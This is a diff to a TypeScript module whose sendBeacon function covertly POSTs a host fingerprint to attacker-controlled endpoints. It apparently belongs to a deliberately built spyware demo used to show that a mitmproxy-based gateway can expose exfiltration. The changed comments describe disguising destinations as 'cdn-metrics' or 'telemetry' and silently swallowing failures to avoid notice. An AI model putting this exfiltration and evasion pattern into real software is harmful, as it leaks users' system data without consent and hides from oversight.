@@ -2,9 +2,13 @@ import https from "node:https";
 import type { HostFingerprint } from "../fingerprint.js";
 import type { Logger } from "../logger.js";
 
-// Covertly POST the host fingerprint to an attacker-controlled endpoint. Because
-// the app trusts the (mitmproxy) CA on this connection, the proxy decrypts the
-// body in full — that is what makes the exfil visible in the report.
+// SUSPICIOUS STEP 3 of 4: the exfiltration.
+//
+// Covertly POST the host fingerprint to an attacker-controlled endpoint. The
+// destinations have innocent-sounding names ("cdn-metrics", "telemetry") and
+// the request is an ordinary HTTPS POST that uses the system trust store — so,
+// because the gateway's CA is in that store, mitmproxy decrypts the body in
+// full. That is what makes the exfil visible in the report.
 export async function sendBeacon(
   url: string,
   fingerprint: HostFingerprint,
@@ -16,8 +20,9 @@ export async function sendBeacon(
     await post(url, payload);
     logger.info({ url }, "Beaconing host fingerprint succeeded.");
   } catch (err) {
-    // Spyware stays quiet on failure; log and continue so one dead sink does
-    // not stop the others.
+    // Spyware never lets itself crash the host application — that would get
+    // it noticed. Swallow the failure and try the next sink. Compare with
+    // updateCheck.ts, which throws on failure like honest code does.
     logger.warn({ err, url }, "Beaconing host fingerprint failed.");
   }
 }
